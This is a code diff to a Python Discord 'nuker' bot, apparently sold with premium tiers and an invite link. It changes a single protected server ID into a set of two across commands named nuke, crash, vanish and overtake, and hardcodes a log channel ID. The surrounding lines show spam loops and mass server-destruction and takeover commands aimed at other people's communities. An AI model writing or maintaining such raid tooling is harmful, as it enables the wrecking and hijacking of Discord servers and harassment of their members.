@@ -98,10 +98,10 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
-WHITELISTED_SERVER_ID = 1453064260555903225
+WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656}
 
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
-    if guild.id == WHITELISTED_SERVER_ID:
+    if guild.id in WHITELISTED_SERVER_IDS:
         print(f"{g}[+] Nuke attempted on whitelisted server {guild.name} ({guild.id}) - Blocked.")
         return
     msg = custom_message or SPAM_MESSAGE
@@ -151,7 +151,7 @@ async def on_ready():
 {g}[+] Logged in as {client.user}
 {y}[!] Slash Commands Enabled
 {y}[!] Status: Streaming .gg/wepaid JOIN NOW
-{y}[!] Whitelisted Server: {WHITELISTED_SERVER_ID}
+{y}[!] Whitelisted Servers: {WHITELISTED_SERVER_IDS}
 {c}--------------------------------------------''')
     asyncio.create_task(check_logs_task())
 
@@ -187,7 +187,7 @@ async def check_logs_task():
             rows = cur.fetchall()
             
             if rows:
-                log_channel_id = get_setting('verify_log_channel_id')
+                log_channel_id = 1479710105292374068
                 if log_channel_id:
                     channel = client.get_channel(int(log_channel_id))
                     if channel:
@@ -269,7 +269,7 @@ async def leave_all_slash(interaction: discord.Interaction):
     fail_count = 0
     
     for guild in client.guilds:
-        if guild.id != WHITELISTED_SERVER_ID:
+        if guild.id not in WHITELISTED_SERVER_IDS:
             try:
                 await guild.leave()
                 left_count += 1
@@ -463,7 +463,7 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
 
 @client.tree.command(name="nuke", description="Nuke the server (Regular Users)")
 async def nuke_slash(interaction: discord.Interaction):
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
@@ -473,7 +473,7 @@ async def nuke_slash(interaction: discord.Interaction):
 async def crash_slash(interaction: discord.Interaction, role_name: str = "GLITCHED BY DRAC"):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
     
     await interaction.response.send_message("🔥 Glitching server...", ephemeral=True)
@@ -486,7 +486,7 @@ async def crash_slash(interaction: discord.Interaction, role_name: str = "GLITCH
 async def vanish_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
         
     await interaction.response.send_message("👻 Ghosting everything...", ephemeral=True)
@@ -498,7 +498,7 @@ async def vanish_slash(interaction: discord.Interaction):
 async def overtake_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
 
     await interaction.response.send_message("⚡ OWNING THIS SERVER...", ephemeral=True)
